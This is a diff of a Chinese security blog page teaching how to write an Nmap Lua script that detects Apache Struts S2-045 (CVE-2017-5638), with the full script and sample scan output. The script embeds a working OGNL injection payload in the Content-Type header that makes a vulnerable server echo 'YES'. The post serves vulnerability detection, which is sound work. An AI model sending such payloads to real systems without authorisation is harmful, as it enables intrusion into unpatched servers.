 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>local</span> payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;%{(#nikenb=</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>multipart/form-data</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>YES</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>)).(#o.close())}&#39;</span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>local</span> options <span style=color:#f92672>=</span> {header<span style=color:#f92672>=</span>{}}
 </span></span><span style=display:flex><span>  options[<span style=color:#e6db74>&#34;no_cache&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>
@@ -88,7 +172,28 @@ stdnse用于处理用户的输入，这里调用了get_script_args用来接收�
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>local</span> req <span style=color:#f92672>=</span> http.get(host, port, uri, options)
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> req
 </span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
-</span></span></code></pre></div><p>这里面有我们的Payload，然后装填<code>User-Agent、Referer、Cookies、Content-Type、uri</code>地址。</p><p><code>stdnse.debug1()</code>这个函数用于输出调试信息，如果你要查看调试信息，那就在扫描的时候带上-d参数</p><p>最后我们用了http库中的get方法，发送了一个请求，返回一个结果对象。</p><p>是不是和Python差不多呢？ :)</p><blockquote><p>获取了结果对象我们就可以进行内容匹配了，如果在内容中寻找到我们的“YES”，那么就存在漏洞。</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>if</span> string.match(req.body, <span style=color:#e6db74>&#39;YES&#39;</span>) <span style=color:#66d9ef>then</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里面有我们的Payload，然后装填<code>User-Agent、Referer、Cookies、Content-Type、uri</code>地址。</p><p><code>stdnse.debug1()</code>这个函数用于输出调试信息，如果你要查看调试信息，那就在扫描的时候带上-d参数</p><p>最后我们用了http库中的get方法，发送了一个请求，返回一个结果对象。</p><p>是不是和Python差不多呢？ :)</p><blockquote><p>获取了结果对象我们就可以进行内容匹配了，如果在内容中寻找到我们的“YES”，那么就存在漏洞。</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>if</span> string.match(req.body, <span style=color:#e6db74>&#39;YES&#39;</span>) <span style=color:#66d9ef>then</span>
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> vuln_report <span style=color:#f92672>=</span> vulns.Report:new(SCRIPT_NAME, host, port)
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> vuln <span style=color:#f92672>=</span> {
 </span></span><span style=display:flex><span>      title <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Struts S2-045&#39;</span>,
@@ -109,11 +214,102 @@ stdnse用于处理用户的输入，这里调用了get_script_args用来接收�
 </span></span><span style=display:flex><span>    vuln.state <span style=color:#f92672>=</span> vulns.STATE.EXPLOIT
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> vuln_report:make_output(vuln)
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
-</span></span></code></pre></div><p>这块就是做了一个字符串匹配，难点在于产生漏洞结果。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>local</span> vuln <span style=color:#f92672>=</span> {
+</span></span></code></pre></td></tr></table></div></div><p>这块就是做了一个字符串匹配，难点在于产生漏洞结果。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>local</span> vuln <span style=color:#f92672>=</span> {
 </span></span><span style=display:flex><span>      title <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Struts S2-045&#39;</span>,
 </span></span><span style=display:flex><span>      state <span style=color:#f92672>=</span> vulns.STATE.VULN,
-</span></span></code></pre></div><p>这个vuln的state属性就用来标识是否存在漏洞的。</p><p>如果存在漏洞，就赋值<code>vulns.STATE.VULN</code>，如果不存在，就赋值<code>vulns.STATE.NOT_VULN</code></p><h2 id=0x04-总结>0x04 总结</h2><p>具体可以多看看那些漏洞利用脚本，因为官方文档真的是不够全面，需要比较深的Lua功底才可以玩的666。
-下面贴出完整代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>--</span>
+</span></span></code></pre></td></tr></table></div></div><p>这个vuln的state属性就用来标识是否存在漏洞的。</p><p>如果存在漏洞，就赋值<code>vulns.STATE.VULN</code>，如果不存在，就赋值<code>vulns.STATE.NOT_VULN</code></p><h2 id=0x04-总结>0x04 总结</h2><p>具体可以多看看那些漏洞利用脚本，因为官方文档真的是不够全面，需要比较深的Lua功底才可以玩的666。
+下面贴出完整代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>--</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- Created by IntelliJ IDEA.</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- User: liyingzhe</span>
 </span></span><span style=display:flex><span><span style=color:#75715e>-- Date: 17-6-3</span>
@@ -201,35 +397,63 @@ stdnse用于处理用户的输入，这里调用了get_script_args用来接收�
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> vuln_report:make_output(vuln)
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
-</span></span></code></pre></div><p>在portrule 绑定的规则中可以自定义扫描规则来决定是否进行扫描</p><p>下面我们开启debug模式看看扫描结果：</p><p><code>nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1 -d</code></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e081baba-4f5e-11ec-9426-00d861bf4abb.png alt=0x02></p></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e0c088d0-4f5e-11ec-ac5c-00d861bf4abb.png alt=0x03></p></p><p>关闭调试模式的扫描结果：<p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e10d49d6-4f5e-11ec-9efe-00d861bf4abb.png alt=0x04></p></p><pre tabindex=0><code>liyingzhe : /usr/share/nmap $nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1
-
-Starting Nmap 7.01 ( https://nmap.org ) at 2017-06-03 03:09 CST
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.000051s latency).
-Not shown: 995 closed ports
-PORT     STATE SERVICE
-80/tcp   open  http
-631/tcp  open  ipp
-1080/tcp open  socks
-|_struts: ERROR: Script execution failed (use -d to debug)
-3306/tcp open  mysql
-|_struts: ERROR: Script execution failed (use -d to debug)
-8899/tcp open  ospf-lite
-| struts: 
-|   VULNERABLE:
-|   Struts S2-045
-|     State: VULNERABLE (Exploitable)
-|     IDs:  CVE:CVE-2017-5638
-|       The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
-|
-|     Disclosure date: 2017-03-07
-|     References:
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
-|       http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474
-|_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
-
-Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
-liyingzhe : /usr/share/nmap $
-</code></pre><p>PS：本文为一叶知安首发，作者：倾旋。未经授权请勿转载。</p><p>如果你想了解更多或者想加入我们的读者群，可以加我的微信：<code>Guest_Killer_0nlis</code>。</p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
-to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
-<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
+</span></span></code></pre></td></tr></table></div></div><p>在portrule 绑定的规则中可以自定义扫描规则来决定是否进行扫描</p><p>下面我们开启debug模式看看扫描结果：</p><p><code>nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1 -d</code></p><p><img src=https://images.payloads.online/e081baba-4f5e-11ec-9426-00d861bf4abb.png alt=0x02></p><p><img src=https://images.payloads.online/e0c088d0-4f5e-11ec-ac5c-00d861bf4abb.png alt=0x03></p><p>关闭调试模式的扫描结果：
+<img src=https://images.payloads.online/e10d49d6-4f5e-11ec-9efe-00d861bf4abb.png alt=0x04></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
